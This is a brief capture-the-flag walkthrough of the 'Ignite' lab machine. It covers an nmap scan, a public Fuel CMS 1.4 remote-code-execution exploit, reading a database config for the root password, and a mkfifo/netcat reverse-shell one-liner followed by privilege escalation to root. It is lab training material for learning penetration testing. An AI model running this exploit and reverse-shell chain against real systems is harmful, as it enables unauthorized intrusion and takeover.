
## 1. Ignite

```
nmap -sC -sV -A <IP>
```

We found cms portal whose name is fuel lets search its exploit in kali

```
searchsploit fuel
```

Login into the site and we found its running fuel version 1.4

https://www.exploit-db.com/exploits/50477

Download exploit and change its IP to target machine IP

```
python3 50477.py -u http://<Victim-IP>
```

We got initial login with this

In our main page we found that there’s a link called fuel/application/config/database.php

```
cat /home/www-data/flag.txt
```

Found user flag

```
cat fuel/application/config/database.php
```

Found root user password

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


Now run a netcat listener before

```
nc -lvnp 1234
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

We received reverse shell access

Now we will stable our shell using pty and use bash

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
cd ../../../../

su root
```

Enter password which is mememe

```
find / -name root.txt 2>/dev/null
```

```
cat  /root/root.txt
```

We got root flag

